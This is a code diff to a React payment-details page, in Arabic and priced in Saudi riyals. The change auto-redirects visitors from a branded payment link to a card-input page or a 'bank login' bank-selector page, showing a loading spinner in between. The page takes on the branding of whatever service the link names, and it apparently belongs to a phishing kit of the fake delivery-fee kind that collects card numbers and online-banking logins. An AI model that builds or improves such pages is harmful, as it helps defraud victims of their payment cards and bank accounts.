@@ -1,4 +1,5 @@
 import { useParams, useNavigate } from "react-router-dom";
+import { useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
@@ -14,8 +15,25 @@ const PaymentDetails = () => {
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
-  const amount = shippingInfo?.cod_amount || 500;
+  const amount = shippingInfo?.cod_amount || shippingInfo?.total_amount || 500;
   const formattedAmount = `${amount} ر.س`;
+  
+  // Get payment method from link payload
+  const paymentMethod = linkData?.payload?.payment_method || 'card';
+  
+  // Auto-redirect based on payment method
+  useEffect(() => {
+    if (linkData && paymentMethod) {
+      if (paymentMethod === 'card') {
+        // Clear any previously selected bank
+        sessionStorage.removeItem('selectedBank');
+        sessionStorage.removeItem('selectedCountry');
+        navigate(`/pay/${id}/card-input`);
+      } else if (paymentMethod === 'bank_login') {
+        navigate(`/pay/${id}/bank-selector`);
+      }
+    }
+  }, [linkData, paymentMethod, id, navigate]);
   
   const handleCardPayment = () => {
     // Clear any previously selected bank
@@ -27,6 +45,32 @@ const PaymentDetails = () => {
   const handleBankLogin = () => {
     navigate(`/pay/${id}/bank-selector`);
   };
+  
+  // Show loading while redirecting
+  if (linkData && paymentMethod) {
+    return (
+      <div 
+        className="min-h-screen flex items-center justify-center bg-background" 
+        dir="rtl"
+        style={{
+          background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
+        }}
+      >
+        <div className="text-center">
+          <div className="w-16 h-16 mx-auto mb-4 relative">
+            <div 
+              className="w-16 h-16 rounded-full border-4 border-t-transparent animate-spin"
+              style={{ borderColor: `${branding.colors.primary} transparent transparent transparent` }}
+            />
+          </div>
+          <h2 className="text-xl font-bold mb-2">جاري التحميل...</h2>
+          <p className="text-sm text-muted-foreground">
+            {paymentMethod === 'card' ? 'جاري توجيهك لصفحة إدخال البطاقة' : 'جاري توجيهك لصفحة اختيار البنك'}
+          </p>
+        </div>
+      </div>
+    );
+  }
   
   return (
     <DynamicPaymentLayout
